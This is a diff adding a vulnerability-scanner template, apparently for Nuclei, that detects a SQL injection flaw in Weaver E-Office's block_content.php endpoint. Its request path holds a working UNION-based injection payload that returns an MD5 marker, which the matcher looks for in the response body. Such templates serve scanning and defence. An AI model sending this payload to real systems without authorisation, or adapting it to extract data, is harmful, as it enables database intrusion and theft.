@@ -1,0 +1,25 @@
+id: weaver-eoffice-blockcontent-sqli
+
+info:
+  name: 泛微E-Office block_content.php SQL注入漏洞
+  author: onewin
+  severity: critical
+  description: |
+    泛微E-Office的block_content.php接口存在SQL注入漏洞，攻击者可获取数据库敏感信息[漏洞发现时间：2025-03-17]
+  reference:
+    - https://mrxn.net/jswz/eoffice-general-new_mytable-block_content-sqli.html
+  tags: 泛微-EOffice,泛微-协同办公OA
+
+http:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/general/new_mytable/block_content.php?block_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x71787a6a71,IFNULL(CAST(md5(123456)%20AS%20NCHAR),0x20),0x7171627671)--%20-"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
+        part: body
+      - type: status
+        status:
+          - 200
